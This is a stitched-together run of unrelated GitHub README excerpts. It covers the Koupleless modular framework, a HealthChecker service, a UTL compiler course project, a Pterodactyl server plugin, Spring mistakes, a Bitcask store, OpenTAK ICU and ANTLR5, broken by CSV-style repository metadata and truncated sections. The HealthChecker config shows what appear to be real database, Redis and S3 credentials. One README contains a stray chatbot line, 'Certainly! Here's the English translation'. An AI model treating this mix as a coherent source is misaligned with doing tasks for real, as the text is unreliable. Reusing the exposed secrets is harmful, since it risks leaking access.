                .isExactlyInstanceOf(NumberFormatException.class)
                .hasMessage(""For input string: \""xvxv\"""");
````

<h1 align=""center"">Koupleless: Modular Development Framework and Serving Platform</h1>

<div align=""center"">

English | [ÁÆÄ‰Ωì‰∏≠Êñá](./README-zh_CN.md)

</div>

Would you like your application to start in just 10 seconds, consuming only 20MB of memory? Have you encountered issues with large applications causing collaboration bottlenecks and low release efficiency? Are you struggling with the high resource and maintenance costs associated with numerous small applications? If you're facing these challenges, then Koupleless might be the solution you're looking for. Koupleless approaches application architecture from a modular perspective, offering an extremely low-cost solution to address pain points encountered throughout the entire lifecycle of application development, operation, and execution:

1. Excessive application fragmentation leading to high machine and long-term maintenance costs
2. Insufficient application fragmentation causing collaboration bottlenecks
3. Lengthy application build, startup, and deployment times resulting in low iteration efficiency
4. Severe fragmentation of SDK versions with high upgrade costs and long cycles
5. High costs associated with building platforms and middle platforms, as well as difficulties in business asset precipitation and architectural constraints
6. Long microservice chains leading to poor call performance
7. High costs associated with microservice decomposition and evolution

How does Koupleless address these issues? Koupleless vertically and horizontally splits traditional applications, with the vertical split separating the base and the horizontal split separating multiple modules. The base shields modules from infrastructure concerns, while modules contain only the business-specific portion, enabling quick startup and insulating them from infrastructure concerns, allowing module developers to experience a Serverless-like environment. Koupleless thus evolves into a low-cost, Serverless solution by refining the granularity of development and operations while shielding infrastructure. For detailed explanations of the principles, please refer to the official website.
Further detailed explanations of the principles are available on [the official website](https://koupleless.io/docs/introduction/architecture/arch-principle/).

![image](https://github.com/koupleless/koupleless/assets/3754074/004c0fa5-62f6-42d7-a77e-f7152ac89248)

The most important aspect is that Koupleless can **assist existing applications** in evolving into a modular development model **at an extremely low cost**, addressing the aforementioned issues and helping businesses reduce costs, increase efficiency, and enhance competitiveness.

## The Advantages of Koupleless

Koupleless is a mature development framework and operational scheduling platform capability that has been refined internally within Ant Group for 5 years. Compared to traditional image-based application models, it offers approximately 10 times improvement in development, operations, and runtime calling. Summarized into 5 key features: Fast, Cost-efficient, Flexible deployment, Smooth evolution, and Production-scale validation.

## What is a Module?

Modules utilize extreme sharing and isolation technologies, which enable hot deployment (updating online code without restarting the machine).

Isolation is achieved through ClassLoader class isolation based on [SOFAArk](https://github.com/sofastack/sofa-ark) and object isolation based on [SpringBoot SpringContext](https://github.com/spring-projects/spring-boot).

Sharing is facilitated by class delegation loading based on [SOFAArk](https://github.com/sofastack/sofa-ark) and cross-SpringContext object lookup and invocation based on SpringBootManager.

So, in physical terms, a module can be considered as one ClassLoader + one SpringContext.

## What is the BaseÔºü
The base is just a regular application, same with the original app (such as standard SpringBoot).

renmeijian/HealthChecker,master,"> English | [‰∏≠Êñá](README-zh-CN.md)
# Introduction

## What can HealthChecker doÔºü

It can check the health status of all instances of all services in the cluster, as well as the health status of dependencies such as MySql, Redis, OSS, ETCD, etc., for easy scalability.


**Background** 

1. During the operation of services and components, unavailability failures are inevitable. In addition to ensuring high availability, timely warning and recovery of failures are also necessary to avoid causing global unavailability.

2. The health check component only needs to add an active health check component client dependency to the service to be checked to achieve the health check and alarm functions of the service.

3. For components such as databases, simple configuration is required to achieve second level perception of middleware failures, rather than waiting for customer feedback, improving fault handling speed and customer satisfaction with the product.

The active health check and alarm component is divided into three parts, namely **client, server, and alarm service**.

This repository contains all the code for the client and server, excluding alarm services. Due to the different alarm requirements of different businesses, you can develop your own alarm services according to your own business needs, store the inspection results, and then formulate corresponding alarm rules and channels.

```




# Component characteristics and implementation

## Be capable

Can check the health status of all instances of all services in the cluster, as well as the health status of dependencies such as MySql, Redis, OSS, ETCD, etc

## Easy to integrate

This component is easy to integrate into the Spring Boot project with minimal code intrusion.

### For microservice health check: only two steps needed

#### a„ÄÅ Introducing client dependencies in the project of health check planning

```xml
        <dependency>
            <groupId>rpa</groupId>
            <artifactId>health-client</artifactId>
            <version>0.0.1</version>
        </dependency>
```


#### b„ÄÅAdd application.yml configuration to the project for health check

Configuration example:

```yml
# HealthChecker Server deployment address
health-server:
  info:
    ip: 127.0.0.1
    port: 9001
    namespace: dev
```


### For middleware health checks such as MySql

#### a„ÄÅEnable the health check function of the corresponding middleware in the health server, where enableCheck is true to indicate that the health check function of the middleware is enabled. Then configure the middleware connection information.

```yml
server:
  port: 9001
spring:
  application:
    name: health-server

health:
  mysql:
    enableCheck: false  # Is MySQL health check enabled? True enabled, false disabled
    ip: 172.30.92.11  # MySQL access address
    port: 3306 # MySQL access port
    database: rpa # MySQL database name
    user: root
    pwd: '*&T3*1(%imk@VB'
  redis:
    enableCheck: false # Is Redis health check enabled? True enabled, false disabled
    ip: 172.30.92.11
    port: 6379
    pwd: ""&r6Fe$^7%NBm""
  s3:
    enableCheck: false # Is S3 health check enabled? True enabled, false disabled
    ip: ""172.30.92.11:9000""
    bucketName: rpa
    prefix: resource/
    secretKey: ""dyAwnn1eGIlxEepisVQAjHm6qzxXbF3x""
    accessKey: ""grMSBA3SXispbLaB""
  etcd:
    enableCheck: false # Is the ETCD health check enabled? True enabled, false disabled
    ip: 172.30.92.11
    port: 22379
```


#### b„ÄÅIf there are other middleware that require health checks, this component supports extension. The extension steps are as followsÔºö

##### Create configuration mapping class

For Redis configuration: add necessary annotations, set type values (such as Redis), and add connection information fields, as shown in the following figure:
    
![image](https://github.com/renmeijian/HealthChecker/assets/50255831/457799e6-65d4-4a66-9e3a-1f86a2aadd3b)

##### Write the corresponding health check processor

Add @ HealthChecker annotation and set the type value. Implement the HealthCheckProcessor interface and start a thread for health checks, as shown in the following figure:
    
![image](https://github.com/renmeijian/HealthChecker/assets/50255831/d3e5d91d-b49a-446f-857b-21f563a1ea8d)

    

## High-performance

**Asynchronous**

Blocking queue

Put the task of service registration into a blocking queue and use thread pool stepping to complete instance updates, thereby improving concurrent writing capabilities.

**Thread pool**

 Timed threads can be reused

**Connection pool**

 Database check connection reusability

**Double-Checked Lock**  
 
 Ensure that there is only one instance in the application

## Low Coupling

**Observer mode**

Minimize dependencies as much as possible, making them easier to maintain and with low coupling

## Functional Cohesion

Registration processing, heartbeat processing, sending HTTP requests, and other functions are separately packaged into classes

## Strong scalability

**Strategy mode**

Select the corresponding HealthCheckProcessor instance based on the type of task for processing, and delegate the specific processing logic to the corresponding processor


# Other technical points

**synchronized**

Lock the action of modifying the service list to avoid security issues of concurrent modifications


**Double-Checked Lock**

Ensure thread safety and reduce synchronization overhead

**CopyOnWrite**

In the addIPAddress method, the old instance list will be copied and a new instance will be added to the list. After updating the instance status, the old instance list will be directly overwritten with the new list. During the update process, the old instance list is not affected and can still be read while processing heartbeats and determining health status.



# The next step

Health server is highly available, enabling multi instance deployment and data synchronization between nodes

mmd-nemati/Compiler-Course-Projects-F2023,main,"# UT Trade Language Compiler
##### Program Language & Compiler course project in fall 2023 at UT, lectured by Dr. Ghasemi.

---
## Overview:
 - UT Trade Language (UTL) is a language designed by PLC course team, to do algorithmic trading in cryptocurrency market. 
 - UTL scripts need a broker to work properly. 
 - UTL is a strongly statically-typed language and supports standard types such as `int`, `float`, `boolean`, `string` and some complex new types such as `Candle` and `Trade` which are used in trading scripts.
 - It has most of basic programming structures, such as `local-global variable`, `function`, `while`, `for`, `try catch`, `Exception`, `if else`, `comment` and etc.
 - The overal structure is similliar to C++, having a Main function and its typing system.
 - Full details are presented in the [documentation](https://github.com/mmd-nemati/Compiler-F02-Projects/blob/main/UTL-Documentation/UT%20Trading%20Language%20Documentation.pdf).
 - A sample code is given below.
  ``` java 
void Main() {
    try {
        Connect(""username"", ""password"");
        string market = ""USDETH"";
        Trade t1 = Observe(market);
        Trade t2 = Observe("""");
        Trade t3 = Observe(""IRRETH"");
    }
    catch Exception e {
        if (e.Type == 1)
            Print(""Login Failure!"");
    }
    @schedule (t1 preorder t3) parallel t2;
    //@schedule (t1 parallel t2) preorder (t3 parallel t4);
 }
```

## Projects:

  <summary> <h4> We implemented the language complier using ANTLR4 and Java in 4 phases.</h3></summary>

1. In [Phase 1](#phase-1---lexer-and-parser), the Lexical analyzer and Syntax analyzer paresr were developed using Antlr4.
2. [Phase 2](#phase-2---ast-and-name-analyzer) was dedicated to implementing generating AST from the input and also Name analyzer.
3. In [Phase 3](#phase-3---type-analyzer) *which in fact was practical exam* the implementing of the Type analyzer was completed.
4.  In [the last Phase](#phase-4---code-generation), we implemented the compilation of the program by generating Java Bytecode of the input script.


---
### Phase 1 - Lexer and Parser:
- In this phase all tokens of the language were described in Antlr which has a regular expression approach same as mentioned in the course. 
- Using these tokens we developed the grammer of the language. It is a LL(K) parser which we tried to guarantee no ambiguity.
- In the end we put some ```print``` as semantic actions in the grammer, so we can verify its correctness.
- A sample code for this phase:
```Antlr
// Parser

while_loop
    : WHILE   { System.out.println(""Loop:while""); }
      LPAR
      if_statement
      RPAR
      loop_body
    ;
// Tokens

WHILE:      'while';
CONTINUE:   'continue';
BREAK:      'break';
RETURN:     'return';
IF:         'if';
ELSE:       'else';
```
### Phase 2 - AST and Name Analyzer:
- In this phase we modified the grammer file to also generate the AST and fill the nodes of the tree.
> Following steps all have a Visitor Pattern which was discussed in the course.
- After generating the AST and printing it, we use Symbol Table approach to store the names and check various naming error such as:
  - duplicate names of the variables
  - conflict names of the variables and functions
  - redefinition of the functions
  - etc...
- Sample codes for this part:
``` Antlr
// Grammer code for AST:

whileStatement returns [WhileStmt whileStmtRet] :
    WHILE LPAREN e = expression RPAREN
    {
        $whileStmtRet = new WhileStmt($e.expressionRet);
        $whileStmtRet.setLine($WHILE.line);
    }
    (LBRACE (s = statement { $whileStmtRet.addBody($s.statementRet); })* RBRACE | s = statement { $whileStmtRet.addBody($s.statementRet); })
    ;
```
``` Java
// Name Analyzer code:
@Override
public Void visit(VarDeclaration varDeclaration) {
    var variableItem = new VariableItem(varDeclaration.getIdentifier().getName(), varDeclaration.getType());
    try {
        SymbolTable.top.get(""Function_"" + varDeclaration.getIdentifier().getName());
        nameErrors.add(new FunctionVariableConflict(varDeclaration.getLine(), varDeclaration.getIdentifier().getName()));
    }
    catch (ItemNotFoundException e) { // pass }
    SymbolTable currentTable = SymbolTable.top;
    try {
        currentTable.put(variableItem);
    } catch (ItemAlreadyExistsException e) {
        nameErrors.add(new VariableRedefinition(varDeclaration.getLine(), varDeclaration.getIdentifier().getName()));
    }

    return null;
}
```
### Phase 3 - Type Analyzer:
- As mentioned above, this phase was a 2-hours long practical exam. So not much features were implemented.
- We use the Symbol Table to determine type of the expressions and statements. Also a No-Type approach was used for bad typing. Errors:
  - using a non-boolean for conditions
  - mis-matched type for operators like `+`
- A sample code for this phase:
``` Java
// Type checking code:
@Override
public Void visit(WhileStmt whileStmt) {
    Type conditionType = whileStmt.getCondition().accept(expressionTypeChecker);
    if (!(conditionType instanceof BoolType)) {
        typeErrors.add(new ConditionTypeNotBool(whileStmt.getLine()));
    }
    whileStmt.getBody().forEach(statement -> statement.accept(this));
    return null;
}
```
### Phase 4 - Code Generation:
- In this phase, the compiler can generate a Java Bytecode (in [Jasmin](https://jasmin.sourceforge.net/) syntax) which can be run by an assembler.
- Again we use a Visitor Pattern to visit each node of the AST and generate its corresponding bytecode.
- Some of the features of this code generation:
  - short-circuit implementation for ```&&``` and ```||``` operations
  - using of ```if_icmpeq``` for equity of integers
  - using of ```bipush``` for pushing values on the stack 
- A sample code for this phase:
``` Java
// Code generation code:
@Override
public String visit(WhileStmt whileStmt) {
    ArrayList<String> commands = new ArrayList<String>();
    String startL = getLabelStr();
    String exitL = getLabelStr();

    commands.add(startL + "":"");
    if (whileStmt.getCondition() != null) {
        commands.add(whileStmt.getCondition().accept(this));
        commands.add(""ifeq "" + exitL);
    }
    for (Statement statement : whileStmt.getBody())
        commands.add(statement.accept(this));
    commands.add(""goto "" + startL);
    commands.add(exitL + "":"");

    return String.join(""\n"",commands);
}
```

BungeePteroPower is a plugin that can automatically start/stop servers based on the number of players.  
It can start and stop servers on the [Pterodactyl panel](https://pterodactyl.io/) when players join or leave the Bungeecord proxy server.  
This helps to save server resources and manage servers more efficiently.  

https://github.com/Kamesuta/BungeePteroPower/assets/16362824/019fdfc5-f0fc-4532-89f3-3342b5812593

## Key Features

- Automatically stops servers using Pterodactyl's API when there are no players on the server for a certain period of time.
    - The time until shutdown can be configured for each server.
- Automatically starts servers using Pterodactyl's API when players join the server.
- Permissions settings allow for specifying players who can manually start servers and players for whom automatic startup is enabled upon joining.
- You can reset the server from a backup when it shuts down.
    - This is useful when creating mini-game servers that reset once played.

![Overview](https://github.com/Kamesuta/BungeePteroPower/assets/16362824/3cece79e-b41a-4119-a6cd-4800dd4f705d)

## Download

- You can download it from [Spigot](https://www.spigotmc.org/resources/%E2%9A%A1-bungeepteropower-%E2%9A%A1-start-stop-servers-when-player-join-leave.114883/) or [GitHub Releases](https://github.com/Kamesuta/BungeePteroPower/releases).

## Requirements

- Java 11 or higher
    - uses `java.net.http.HttpClient` in Java 11 for REST API communication with Pterodactyl.

## Getting Started

1. Obtain an API key in the Pterodactyl panel.
    - The client API key for Pterodactyl can be found in the ""API Credentials"" tab on the account page.
2. Add the plugin to the BungeeCord server and start it.
3. Configure the [Required Settings](#required-settings) in the generated `plugins/BungeePteroPower/config.yml` file.
    ```yml
    # Pterodactyl configuration
    pterodactyl:
      # The URL of your pterodactyl panel
      # If you use Cloudflare Tunnel, you need to allow the ip in the bypass setting.
      url: ""https://panel.example.com""
      # The client api key of your pterodactyl panel. It starts with ""ptlc_"".
      # You can find the client api key in the ""API Credentials"" tab of the ""Account"" page.
      apiKey: ""ptlc_000000000000000000000000000000000000000000""
    
    # Per server configuration
    servers:
      pvp:
        # Pterodactyl server ID
        # You can find the Pterodactyl server ID in the URL of the server page.
        # For example, if the URL is https://panel.example.com/server/1234abcd, the server ID is 1234abcd.
        id: 1234abcd
        # The time in seconds to stop the server after the last player leaves.
        # If you don't want to stop the server automatically, set it to -1.
        # If you set it to 0, the server will be stopped immediately after the last player leaves.
        timeout: 30
    ```
4. Reload the config with the `/ptero reload` command.
5. Configure the [Permission Settings](#permission-settings).  
    (You **MUST** configure permission to use this plugin, otherwise the player will not be able to do anything!)  
    You can use either of the following methods.  
    - Use a permission plugin like [LuckPerms](https://luckperms.net/).
        1. For LuckPerms, use the following commands to set permissions:
            ```
            # The player can start all servers
            /lp user <player_name> permission set ptero.autostart.*
            # The player can start specific server
            /lp user <player_name> permission set ptero.autostart.<server_name>
            # All players can start all servers
            /lp group default permission set ptero.autostart.*
            ```
            ‚Äª `<player_name>` refers to the player's name, `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.
    - Use built-in permission settings.
        1. Open `config.yml`.
        2. Add the following settings to the `config.yml` file.
            ```yml
            permissions:
                default:
                # All players can start all server
                - ptero.autostart.*
                # All players can start specific server
                - ptero.autostart.<server_name>
            ```  
            ‚Äª `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.
        3. Restart the BungeeCord server.
  
## Usage

### Automatic Startup

- Servers will automatically start when players attempt to join each server on BungeeCord.
    - This feature is available only to players with the `ptero.autostart.<server_name>` permission.

### Manual Start/Stop

- Use the `/ptero start <server_name>` command to manually start a server.
    - This command is available only to players with the `ptero.start.<server_name>` permission.
- Use the `/ptero stop <server_name>` command to manually stop a server.
    - This command is available only to players with the `ptero.stop.<server_name>` permission.

‚Äª `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.

### Reloading config.yml/Language files

- Use `/ptero reload` to reload the config.yml and language files.

## Configuration

The `config.yml` file includes the following settings, but not all items need to be configured.

### Required Settings

- `pterodactyl`: Configure settings for Pterodactyl, including URL and API key.
    - `url`: Set the URL of your Pterodactyl panel. (Example: https://panel.example.com/)
        - If you are using services like Cloudflare Tunnel, ensure proper bypass settings for IP-based communication.
    - `apiKey`: Set the client API key for Pterodactyl.
        - It begins with `ptlc_`.
        - Client API keys for Pterodactyl can be found in the ""API Credentials"" tab on the account page.
- `servers`: Configure settings for each server. Set the server ID and the time until automatic shutdown.
    - `id`: Set the server ID on Pterodactyl.
        - Server IDs on Pterodactyl can be found in the URL of the server page.
        - For example, if the URL is https://panel.example.com/server/1234abcd, the server ID is 1234abcd.

### Optional Settings

- `version`: Set the version of the plugin.
    - When updating the plugin, a warning will be displayed if this value does not match the plugin version.
    - A `config.new.yml` file will be generated, and manual migration of settings using a merge tool is required.
    - After migration, please change this value to the new version.
- `checkUpdate`: Set whether to check for plugin updates. The default is `true`.
- `language`: Set the language to be used. The default is English (`en`).
    - Refer to the comments in the [config file](./src/main/resources/config.yml) for supported languages.
- `startTimeout`: After starting a server with this plugin, it will stop the server if there are no players for a certain period. The unit is seconds.
    - After starting, the server will stop after the `startTimeout` plus the server's timeout duration.
    - Setting it to 1 keeps the server running until players join and leave.
- `powerControllerType`: Set the type of power controller to be used.
    - The built-in PowerController currently supports only `pterodactyl`, which operates Pterodactyl.
    - By adding add-ons, you can add your own custom PowerController.
      Certainly! Here's the English translation of the provided description:
- `useSynchronousPing`: This setting determines whether to perform **synchronous** pinging to the server during login. (Experimental feature)
    - When enabled, pinging the server during login will happen synchronously rather than asynchronously.
    - This allows displaying BungeePteroPower messages (`join_autostart_login` in messages.yml) instead of the ""Could not connect to a default or fallback server"" message upon login.
    - The default value is `false`. Enabling this can be useful if you want to set servers (such as lobby servers) to a suspended state in BungeePteroPower immediately after login.
- `startupJoin`: After server startup, it is used to automatically join players to the server and check the server's status.
    - `timeout`: Set the maximum waiting time for players to join after server startup.
        - Set this value to the maximum time it takes for the server to start.
        - Setting it to 0 disables this feature, and players will not automatically join after startup.
    - `joinDelay`: Once the server is pingable, wait the specified amount of seconds before sending the player to the server
        - This is useful to wait for plugins like Luckperms to fully load
        - If you set it to 0, the player will be connected as soon as the server is pingable
    - `pingInterval`: Set the interval for checking the server's status.
- `restoreOnStop`: Configure settings for the feature to reset the server from a backup when it is stopped.
    - `timeout`: Set the maximum waiting time after sending the stop signal for the server to stop. (The restore will be performed after the server stops)
    - `pingInterval`: Set the interval for checking if the server is offline after sending the stop signal.
- `servers`: Configure settings for each server. Set the server ID and the time until automatic shutdown.
    - `timeout`: When there are no players on the server, it will stop after a certain period. The unit is seconds.
    - `backupId`: The UUID of the backup to restore when the server stops.
        - If this setting is empty or removed, no restore from backup will be performed when the server stops.
        - Useful for servers that need to be reset after each game.

### Permission Settings

BungeePteroPower plugin allows fine-grained control over commands available to players for each server using permissions.

- `ptero.autostart.<server_name>`: Servers will automatically start when players join each server on BungeeCord for players with this permission.
- `ptero.start.<server_name>`: Allows the `/ptero start <server_name>` command to manually start a server.
    - If a player doesn't have `ptero.autostart.<server_name>` permission but has this permission, they will see a manual start button when they join the server.
- `ptero.stop.<server_name>`: Allows the `/ptero stop <server_name>` command to manually stop a server.
- `ptero.reload`: Allows the `/ptero reload` command to reload the config.

‚Äª `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.
‚Äª Specify `*` for `<server_name>` to apply permissions to all servers.

### About Language Files

- You can set the language in config.yml using the language option.
    - Please refer to the comments in the config file for the supported languages.
- Upon startup, a file for the language set in config.yml will be generated.
    - This file allows you to define only the messages you want to change.
    - Messages that are not defined will be loaded from the language file set within the plugin.
- You can edit and then reload the plugin's language by using the `/ptero reload` command.
- Contributions via Pull Requests for additional language files are welcome.

## Information for Plugin Developers

### About Power Controllers

BungeePteroPower provides a Power Controller API for supporting platforms other than Pterodactyl.  
By creating add-ons, you can add power controllers for platforms other than Pterodactyl!

We also welcome pull requests for adding built-in power controllers!  
Ideally, we would like to support the following:
- Power controllers that can start servers locally
- Power controllers compatible with management software other than Pterodactyl.  
    For example, we would like to support the following:
    - PufferPanel
    - Minecraft Server Manager
    - MCSManager
    - MC Server Soft
    - AMP

### Creating Add-ons

- BungeePteroPower provides an API for integration with other plugins.
    - If you want to support platforms other than Pterodactyl, it is possible by implementing the API.
- You can use the BungeePteroPower API by adding dependencies.
    1. Add the JitPack repository inside the pom.xml of your add-on:
        ```xml
        <repositories>
            <repository>
                <id>jitpack.io</id>
                <url>https://jitpack.io</url>
            </repository>
        </repositories>
        ```
    2. Add BungeePteroPower as a dependency:
        ```xml
        <dependency>
            <groupId>com.github.Kamesuta</groupId>
            <artifactId>BungeePteroPower</artifactId>
            <version>version</version>
        </dependency>
        ```
    3. Add the dependency to your plugin.yml:
        ```yml
        depends:
          - BungeePteroPower
        ```
    4. Use the API:
        ```java
        import com.kamesuta.bungeepteropower.api.BungeePteroPowerAPI;

        public class YourPlugin extends JavaPlugin {
            @Override
            public void onEnable() {
                // Get an instance of BungeePteroPowerAPI
                BungeePteroPowerAPI api = BungeePteroPowerAPI.getInstance();
                // Register your custom PowerController
                api.registerPowerController(""your_service"", new YourPowerController());
            }
        }
        ```
        For an example implementation of a PowerController for Pterodactyl, please refer to [PterodactylController.java](./src/main/java/com/kamesuta/bungeepteropower/power/PterodactylController.java).

[X Tutorial](https://twitter.com/therealdanvega/status/1750539660886004093)

## Client Request Factories

The `RestClient` uses an underlying Http Client to make calls over HTTP. If you want to read more about this you can check
out the [Spring Documentation](https://docs.spring.io/spring-framework/reference/integration/rest-clients.html#rest-request-factories). The 
following video is a walkthrough of how to do that. The code for this is located in `/src/main/resources/dev/danvega/rc/client/JdkClient.java`

[YouTube Tutorial](https://youtu.be/9M0NggD6Mbw)


## Testing with @RestClientTest

You can test your `RestClient` code using the `@RestClientTest` annotation.

danvega/spring-common-mistakes,main,"# Spring Developer Common Mistakes

This is a repository of common mistakes we make as Spring Developers. 

[First 5 Common Mistakes](https://www.youtube.com/@danvega)

We did an episode based on this on The Spring Office Hours Podcast: 

[Spring Office Hours S3E4 - Common Spring Developer Mistakes](https://www.youtube.com/watch?v=nd5JzDIEI6A)

## 1. Making Everything Public 

When you get dropped into a Spring Boot project you have free rein to organize your project however you want. This is great because it allows you to put your code wherever you want. However, a lot of us (me included) follow a convention where we use a package by layer architecture. This causes code that is closely related to be split into different packages and therefore having to make everything public which is not how we would typically write code.

[Package by Layer vs Package by Feature](https://youtu.be/B1d95I7-zsw)

## 2 Field Injection

A common mistake is choosing field injection for Dependency Injection. There are a number of reasons that you should
favor constructor injection over field injection.

[Spring Constructor Injection: Why is it the recommended approach to Dependency Injection?](https://youtu.be/aX-bgylmprA)

## 3. Interface and Implementation when not necessary

There is a right place and a right time to create interfaces but in this common mistake we take a look at a time where it doesn't make a lot of sense. 

## 4. Proper REST API Design

Spring Boot gives you the tools to quickly and easily stand up a REST API. A common mistake I often see is creating REST resources with improper URIs. When you create a REST resource the request method should describe the intention, not the URI.

## 5. Improper Exception Handling

When a user expects a response and none is given that isn't a good experience. It's better to return something and in the case of asking for a resource by an invalid id it's often good practice to handle that exception. ",0,1,11,,,0.0
ndancing/bitcask,master,"# bitcask

A simple Bitcask implementation in Java

**Bitcask**

A Log-Structured Hash Table for Fast Key/Value Data

**What does Bitcask offer?**

1. Low latency per item read or written
2. High throughput, especially when writing an incoming stream of random items
3. Crash friendliness, both in terms of fast recovery and not losing data
4. Ease of backup and restore

**Bitcask paper**

https://riak.com/assets/bitcask-intro.pdf

### Server
**1. Storage config**

| Properties      | Description             | Default Value |
|-----------------|-------------------------|---------------|
| storageDir      | Data stored directory   | /bcask        |
| cacheEnabled    | Enable/disable cache    | true          |
| cacheSize       | Cache size (if enabled) | 10000         |
| fileSizeLimit   | Data file size limit    | 10MB          |
| mergePeriodMils | Data file merge period  | 5 mins        |

**2. Start a Bitcask Server**

Application.java
```Java
int port = Integer.valueOf(System.getProperty(""port""));
String storageDir = System.getProperty(""storageDir"");
BitcaskStorageConfig storageConfig = BitcaskStorageConfig.builder()
    .storageDir(storageDir)
    .cacheEnabled(true).cacheSize(10000)
    .fileSizeLimit(1024000).mergePeriodMils(300000)
    .build();

BitcaskServer server = new BitcaskServer(port, storageConfig);
server.start();
```

Execution:
```shell
mvn clean install
mvn exec:java -Dexec.mainClass=com.github.ndancing.kv.server.Application -Dport=6868 -DstorageDir=/data/bcask
```
**3. Command Line**

After start a Bitcask server, using the console to execute these commands:

- Store key/value pair to storage
```shell
SET example_key ""example value""
```

- Get value of a key from storage
```shell
GET example_key
```

- Remove a key/value pair
```shell
RMV example_key
```
**Notes:**

_Key must not contain any whitespace and value must be surrounded by double quotes_

### Java Client Usage

**1. Connect to a Bitcask server**
```java
BitcaskClient client = Bitcask.builder()
    .host(""127.0.0.1"")
    .port(6868)
    .timeOutMils(3000)
    .build();
```

**2. API Usage**

Bitcask key interface
```java
BKey<String> bcaskKey = client.getKey(""example_key"");
```
Throws **BitcaskException** if key is empty or contains any whitespace

- Set a key/value pair
```java
bcaskKey.setValue(""example value"");
```
Return **true** if set key/value successfully, otherwise return **false**

- Get value of a key from storage
```java
bcaskKey.getValue();
```
Return value of key or throws **BitcaskNotExistedKeyException** if key is not existed

- Remove a key
```java
bcaskKey.remove();
```
Return true if remove key successfully, otherwise return false or throws **BitcaskNotExistedKeyException** if key is not existed

### About Storage

**How does the data file merging work?**

Steps

1. Get all stored file exclude currently active file -> Mergeable files
2. Scan from closest to furthest mergeable files -> Build a key-value mapping from each one. Using a metadata container to store last key-metadata mapping
3. Create a compacted file to merge all processed files . Give it a name like to the closest merged file append with a suffix (to avoid duplicated file name)
4. Write all last mapping data to the compact file. In this step need to check and remove deleted key (tombstone value)
5. Update the merged metadata with the closest merged file path
6. Delete all merged files then rename the compact file to closest merged file
7. Update the merged mapping metadata to storage

**Storage Benchmark**

- Environment: MacBook Pro (16-inch, 2021), Apple M1 Pro, 16GB, SSD 512GB. Amazon Corretto 17
- No buffered file output
- No cache enabled

# OpenTAK ICU

OpenTAK ICU is a video streaming app based on [RootEncoder](https://github.com/pedroSG94/RootEncoder) 
that can stream audio and video to RTSP(S), RTMP(S), and SRT servers such as 
[MediaMTX](https://github.com/bluenviron/mediamtx). Its primary focus is to work with the TAK ecosystem.

## Why?

While ATAK already has the TAK ICU plugin, it doesn't seem to support a few features. Specifically
it doesn't support streaming audio or using authentication and encryption (RTSPS) at the same time.

## Download
Get the APK from this repo's [latest release](https://github.com/brian7704/OpenTAK_ICU/releases/latest)

## Documentation

See the full documentation [here](https://docs.opentakserver.io/opentak_icu).

## Features
- Video Codecs
  - H264
  - H265
  - AV1
- Audio Codecs
  - AAC
  - G711
  - OPUS
- Streaming protocols
  - RTSP
  - RTSPS
  - RTMP
  - RTMPS
  - SRT (SRT does not yet support authentication)
  - Multicast UDP
- Authentication
- Servers with self-signed certificates
- Background streaming and recording - Continue streaming and recording audio and video even if the app
is minimized or the screen is off.
- Record video to the device while streaming
- Take photos while recording or streaming
- Change between front and back cameras during stream
- Adaptive bitrate

## Planned features
- KLV
- Stream your device's screen instead of camera
- USB camera support

## Servers
This app has been developed using [MediaMTX](https://github.com/bluenviron/mediamtx) as the 
streaming server but any RTSP/RTMP server should work.

## Viewing OpenTAK ICU streams from MediaMTX in ATAK
In the video tool, tap the + symbol to add a new stream and use the following settings:
- Type: rtsp
- Address: Your server's IP address or domain name
- Port: The defaults are 8554 for RTSP and 8322 for RTSPS
- Path: The stream's path that is set in OpenTAK ICU's settings
- Username/Password: Required only if your server enforces authentication
- Reliable P2P Connection: Enables a TCP connection and is required if there is a NAT/firewall
  between your EUD and the server.

## Viewing the stream in a browser
When using MediaMTX and streaming with H264, you can watch the live stream in a browser by going to

`http://your_server_ip:8888/stream_path` 

for an HLS stream or

`http://your_server_ip:8889/stream_path`

for a WebRTC stream. Note that most browsers don't yet
support H265. See [CanIUse](https://caniuse.com/hevc) for details. Also note that WebRTC does not
support AAC audio so you will need to use OPUS or G711 if you're viewing the stream via WebRTC.

## Viewing streams in VLC
1. Click on Media -> Open Network Stream
2. In the URL field enter `rtsp://your_server_address:8554/your_path`
3. Click Play

## Adaptive Bitrate
When adaptive bitrate is enabled, the video bitrate will change based on your network/internet connection.
If the connection can't send packets fast enough, the bitrate will lower. If the connection is good
the bitrate will max out at what the bitrate setting's value is.

## Servers with self-signed certificates
If your server is using self signed certificates and you wish to stream encrypted audio and video,
you'll need your server's trust store certificate in PKCS12 (.p12 file extension) format. If your 
RTSP server is using the same certificates as your TAK server, you can use the same trust store 
certificate and certificate password in OpenTAK ICU. After selecting the certificate and providing
the certificate password, press the Test Certificate button. This simply validates that the certificate
is the correct format and that the password is correct.

[![Java 21+](https://img.shields.io/badge/java-21+-4c7e9f.svg)](https://jdk.java.net)
[![License](https://img.shields.io/badge/license-BSD-blue.svg)](https://raw.githubusercontent.com/antlr/antlr5/master/LICENSE.txt)

**ANTLR** (ANother Tool for Language Recognition) is a powerful parser generator for reading, processing, executing, or translating structured text or binary files. It's widely used to build languages, tools, and frameworks. From a grammar, ANTLR generates a parser that can build parse trees and also generates a listener interface (or visitor) that makes it easy to respond to the recognition of phrases of interest.

_This is a new version of ANTLR, in an early development stage_. _If you are looking for a production ready version look into [ANTLR v4](http://antlr4.org/)_.

**Dev branch build status**

[![MacOSX, Windows, Linux](https://github.com/antlr/antlr5/actions/workflows/hosted.yml/badge.svg)](https://github.com/antlr/antlr5/actions/workflows/hosted.yml) (github actions)

## v5 vs v4

ANTLR 4 supports 10 target languages, and each of them requires a dedicated full runtime.
With the advent of [WebAssembly](https://webassembly.org), there is an opportunity to have just 1 runtime, that will run faster with language hosts such as JavaScript or Python.
ANTLR 5 is primarily about that: switching to WebAssembly.
On top of that will come various improvements, currently being specified.

WebAssembly is still being bleeding edge, and the 1st version of ANTLR5 will only support TypeScript.
As other platforms provide support for recent WebAssembly features, such as garbage collection and exception handling, ANTLR5 will rapidly become available for these platforms.

## Repo branch structure

